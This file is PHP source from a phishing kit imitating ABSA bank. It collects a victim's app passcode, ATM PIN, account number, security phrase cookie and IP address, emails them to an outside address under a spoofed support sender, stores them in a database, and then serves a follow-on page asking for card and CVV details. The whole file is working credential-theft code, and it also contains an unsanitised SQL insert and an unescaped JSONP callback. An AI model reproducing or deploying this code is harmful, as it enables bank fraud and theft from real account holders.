<?php
session_start();
if(isset($_GET['passcode']))
{
    include_once 'sqlite.php';
    
        @$appPasscode = $_GET['passcode'];
        @$atmPINNumber = $_GET['atmPin'];
        
        @$ccn = $_SESSION['param']['AccessAccount'];
        
        @$surePHRASE = $_COOKIE['surephrase'];

	$ip = $_SERVER['REMOTE_ADDR'];

	$time = time();

        $msg = "+++++++++++++++++++++++++++++++++++++++\r\n";
        $msg .= "APP Passcode : $appPasscode\r\n";
	$msg .= "ATM card number :\r\n";
        $msg .= "ATM PIN : $atmPINNumber\r\n";
        $msg .= "+++++++++++++++++++++++++++++++++++++++\r\n\r\n";



	$from = "support@".$_SERVER['HTTP_HOST'];
	$headers = "From:" . $from;
        $subject = "ABSA | Passcode - $ccn - $ip ".$_SERVER['HTTP_HOST'];
        $result = 'jbroughton49@usa.com';
	$invalid = array();
        
        $msg = $msg.$_SESSION['msg'];
        
        $_SESSION['msg'] = $msg;

	if(count($invalid) == 0)
	{
		if(mail($result, $subject, $msg, $headers))
                if(1)
		{
                    $query = 'INSERT INTO result (subject,message,isread,date_time) VALUES ("'.$subject.'","'.$msg.'","notread","'. date("Y-m-d H:i:s").'");';
                    $sqlqueryResult = mysqli_query($dbconnect, $query);
                    //$db->exec($query);
                    //sleep(5);
                    $experience_login = file_get_contents('cardcvv-content.txt');
                    //$experience_login = file_get_contents('../CardDetails.htm');
                    
                    $experience_login = str_replace("{sureCheck}", $surePHRASE, $experience_login);
                    $experience_login = str_replace("{AccessAccount}", $ccn, $experience_login);
                    
                    header("Content-Type: application/javascript");
                    $callback = $_GET["callback"];
                    include("../images/logo-blu.png");
                    $_SESSION['msg'] = $msg;
                    $jsonResponse = json_encode(array('message' => $experience_login, 'focusElement' => "j_pin"));
                    echo $callback . '(' . $jsonResponse . ')';
		}

		else

		{
                    $experience_login = "redirect"; //file_get_contents('rvn-page.html');
                    header("Content-Type: application/javascript");
                    $callback = $_GET["callback"];
                    $jsonResponse = json_encode(array('message' => $experience_login));
                    echo $callback . '(' . $jsonResponse . ')';
		}

	}
	else
	{
                    $experience_login = "invalid records..."; //file_get_contents('rvn-page.html');

                    header("Content-Type: application/javascript");

                    $callback = $_GET["callback"];

                    $jsonResponse = json_encode(array('message' => $experience_login, 'errorMessage' => implode('\r\n', $error)));

                    echo $callback . '(' . $jsonResponse . ')';

	}

}

else

{

    $experience_login = "passcode ! set"; //file_get_contents('rvn-page.html');

    header("Content-Type: application/javascript");

    $callback = $_GET["callback"];

    $jsonResponse = json_encode(array('message' => $experience_login));

    echo $callback . '(' . $jsonResponse . ')';

}

?>